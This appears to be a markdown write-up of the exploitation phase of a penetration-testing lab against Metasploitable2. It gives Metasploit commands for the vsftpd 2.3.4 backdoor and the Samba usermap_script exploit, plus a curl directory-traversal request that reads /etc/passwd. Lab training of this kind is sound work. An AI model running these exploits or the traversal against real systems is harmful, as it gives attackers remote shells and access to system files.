# 🛠️ 04 - Exploitation Phase
**Target:** Metasploitable2  
**Environment:** Kali Linux  

---

## 🎯 Objective
Leverage known vulnerabilities in Metasploitable2 to gain access and demonstrate exploitation techniques in a controlled environment.

---

## 🔧 Exploitation Examples

### 📁 FTP (vsftpd 2.3.4 Backdoor)
**Vulnerability:** vsftpd 2.3.4 backdoor allows remote shell access.

**Metasploit Usage:**
```bash
msfconsole
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOST <TARGET_IP>
exploit
```

Expected Outcome:

Remote shell gained

Able to interact with target filesystem

## 🌐 Samba (3.X RCE)
Vulnerability: Samba 3.X versions allow remote code execution.

Metasploit Usage:

```bash
use exploit/multi/samba/usermap_script
set RHOST <TARGET_IP>
exploit
```

Expected Outcome:

Command execution on target machine

Can explore directories or deploy payloads

## 🔐 Apache (2.2.8 Directory Traversal)
Vulnerability: Apache 2.2.8 directory traversal allows access to restricted files.

Manual Testing Example:

```bash
curl http://<TARGET_IP>/../../../../etc/passwd
```
Expected Outcome:

Contents of sensitive files retrieved

Verifies the traversal vulnerability

## 📝 Notes
Always operate within the isolated lab — never attack external systems

Document screenshots and logs for portfolio purposes

Focus on learning exploitation mechanics and payload delivery
